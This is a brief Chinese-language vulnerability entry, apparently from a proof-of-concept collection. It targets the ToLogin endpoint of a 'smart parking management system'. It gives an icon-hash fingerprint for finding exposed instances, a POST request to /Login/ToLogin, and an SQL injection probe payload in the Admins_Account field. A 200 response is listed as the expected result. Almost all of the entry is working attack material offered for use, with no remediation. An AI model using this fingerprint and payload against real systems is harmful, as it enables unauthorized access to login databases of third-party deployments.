# 智能停车管理系统ToLogin存在SQL注入漏洞

智能停车管理系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="938984120"`
- **请求**：`POST /Login/ToLogin HTTP/1.1`

**Payload**
```
Admins_Account=1"&Admins_Pwd=
```
- **响应特征**：200